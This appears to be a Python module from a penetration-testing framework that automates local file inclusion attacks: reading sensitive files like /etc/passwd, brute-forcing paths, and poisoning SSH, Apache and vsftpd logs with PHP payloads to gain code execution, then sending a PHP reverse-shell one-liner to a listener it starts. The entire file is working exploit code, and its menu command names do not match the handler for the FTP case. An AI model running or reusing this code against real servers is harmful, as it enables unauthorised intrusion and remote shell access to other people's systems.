from core.base.base_module import BaseModule
from core.base.option import OptBool, OptString
from base.function_base import random_text
from core.utils.printer import *
from core.jobs import Jobs
import time
import importlib
import paramiko
import ftplib
import difflib

class Lfi(BaseModule):

	shell_lfi = OptBool(False, "pseudo shell", "no")
	file_read = OptString("/etc/passwd", "file to read in lfi", "yes")
	
	def handler_lfi(self):
		if self.shell_lfi:
			prompt = color_green("lfi:pseudo_shell")
			while True:
				try:
					command = input(f"({prompt}) {self.target}> ")
				except:
					command = input("(lfi:cmd) > ")
				if command == "exit":
					break
				elif command == "help":
					print_info()
					print_info("\thelp menu lfi")
					print_info("\t-------------")
					print_info("\t?check_files_win_big                 Run big windows files")
					print_info("\t?check_files_win_base                Run little files")
					print_info("\t?check_files_linux      	           Run linux files")
					print_info("\t?check_poisoning                     Check poisoning")
					print_info("\t?ssh_poisoning                       Check ssh poisoning")
					print_info("\t?apache_poisoning                    Check apache poisoning")
					print_info("\t?vsftp_poisoning                     Check vsftp poisoning")
					print_info()
				
				elif command == "?check_files_win_big":
					with open("data/wordlists/lfi/win.txt") as f:
						lines = f.readlines()
						print_status(f"Files found with {len(lines)} lines")
						for line in lines:
							output =self.execute(line.strip())
							if output != "File not found":
								print_success(line.strip())
								
				elif command == "?check_files_win_base":
					with open("data/wordlists/lfi/win_base.txt") as f:
						lines = f.readlines()
						print_status(f"Files found with {len(lines)} lines")
						for line in lines:
							output =self.execute(line.strip())
							if output != "File not found":
								print_success(line.strip())
        
				elif command == "?check_files_linux":
					try:
						with open("data/wordlists/lfi/linux.txt") as f:
							lines = f.readlines()
							print_status(f"Files found with {len(lines)} lines")
							for line in lines:
								output =self.execute(line.strip())
								if output != "File not found":
									print_success(line.strip())
					except:
						print_error("File not found")
						
				
				elif command == "?check_poisoning":
					check = self.execute('/var/log/auth.log')
					if check != "File not found":
						print_status('Potential ssh poisoning found, try command: ?ssh_poisoning')
					else:
						print_status('No ssh poisoning found')
					check = self.execute('/var/log/apache2/access.log')
					if check != "File not found":
						print_status('Potential apache log poisoning found, try command: ?apache_poisoning')
					else:
						print_status('No apache log poisoning found')
					check = self.execute('/var/log/vsftpd.log')
					if check != "File not found":
						print_status('Potential vsftpd log poisoning found, try command: ?ftp_poisoning')
					else:
						print_status('No vsftpd log poisoning found')
      
				elif command == "?ssh_poisoning":
					print_status("Check access /var/log/auth.log")	
					system_function = ['system', 'passthru', 'exec', 'shell_exec', 'proc_open']
					lhost = "127.0.0.1"
					lport = 4444
					for i in system_function:
						get_param = random_text(10)
						payload = f"<?php {i}($_GET['{get_param}']);?>"
						check = self.execute('/var/log/auth.log')
						if check != "File not found":	
							ssh = paramiko.SSHClient()
							ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
							try:
								print_status("Try to login ssh")
								ssh.connect(self.target, 22, payload, 'password',look_for_keys=False, allow_agent=False, timeout=4)					
							except:
								pass	
							payload_test = random_text(25)
							check = self.execute(f"/var/log/auth.log&{get_param}=echo '{payload_test}'")	
							if payload_test in check:	
								print_success("Injection successful!")
								print_success("Start listener...")
								handler = getattr(importlib.import_module("modules.listeners.multi.reverse_tcp"), "Module")()
								handler.exploit_attributes['lhost'][0] = lhost
								handler.exploit_attributes['lport'][0] = lport	
								job_id = Jobs().create_job("Reverse tcp", f":{lport}", handler.exploit, [])
								time.sleep(1)	
								print_success("Sending payload...")
								self.execute(f"""/var/log/auth.log&{get_param}=php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")							
								return
							else:
								print_error(f"Poisoning failed with {i}")
						time.sleep(2)
						
				elif command == "?apache_poisoning":
					print_status("Check access /var/log/apache2/access.log")	
					system_function = ['system', 'passthru', 'exec', 'shell_exec', 'proc_open']
					lhost = "127.0.0.1"
					lport = 4444
					for i in system_function:
						get_param = random_text(10)
						payload = f"<?php {i}($_GET['{get_param}']);?>"
						check = self.execute('/var/log/apache2/access.log')
						if check != "File not found":		
							payload_test = random_text(25)
							check = self.execute(f"/var/log/apache2/access.log&{payload}=echo '{payload_test}'")	
							if payload_test in check:	
								print_success("Injection successful!")
								print_success("Start listener...")
								handler = getattr(importlib.import_module("modules.listeners.multi.reverse_tcp"), "Module")()
								handler.exploit_attributes['lhost'][0] = lhost
								handler.exploit_attributes['lport'][0] = lport	
								job_id = Jobs().create_job("Reverse tcp", f":{lport}", handler.exploit, [])
								time.sleep(1)	
								print_success("Sending payload...")
								self.execute(f"""/var/log/apache2/access.log&{get_param}=php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")							
								return
							else:
								print_error(f"Poisoning failed with {i}")	

				elif command == "?vsftpd_poisoning":
					print_status("Check access /var/log/vsftpd.log")	
					system_function = ['system', 'passthru', 'exec', 'shell_exec', 'proc_open']
					lhost = "127.0.0.1"
					lport = 4444
					for i in system_function:
						get_param = random_text(10)
						payload = f"<?php {i}($_GET['{get_param}']);?>"
						check = self.execute('/var/log/vsftpd.log')
						if check != "File not found":	
							ftp_client = ftplib.FTP()
							try:
								print_status("Try to login ftp")
								ftp_client.connect(self.target, 21, 8.0)
								ftp_client.login(payload, 'password')				
							except:
								pass	
							payload_test = random_text(25)
							check = self.execute(f"/var/log/vsftpd.log&{get_param}=echo '{payload_test}'")	
							if payload_test in check:	
								print_success("Injection successful!")
								print_success("Start listener...")
								handler = getattr(importlib.import_module("modules.listeners.multi.reverse_tcp"), "Module")()
								handler.exploit_attributes['lhost'][0] = lhost
								handler.exploit_attributes['lport'][0] = lport	
								job_id = Jobs().create_job("Reverse tcp", f":{lport}", handler.exploit, [])
								time.sleep(1)	
								print_success("Sending payload...")
								self.execute(f"""/var/log/vsftpd.log&{get_param}=php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")							
								return
							else:
								print_error(f"Poisoning failed with {i}")					
				else:
					try:
						output = self.execute(command)
						print_info(output)
					except:
						print_error("Error in execute function")

		else:
			output = self.execute(self.file_read)
			print_info(output)

	def clean_with_template(self, lfi_text, template_text):
		""" description compare html"""
		output = ''
		t1 = lfi_text.splitlines(1)
		t2 = template_text.splitlines(1)
		diffInstance = difflib.Differ()
		diffList = list(diffInstance.compare(t1,t2))
		for line in diffList:
			if line[0] == '-':
				output+=line.strip()[2:]
				output+='\n'
		return output

	def file_not_found(self):
		return "File not found"
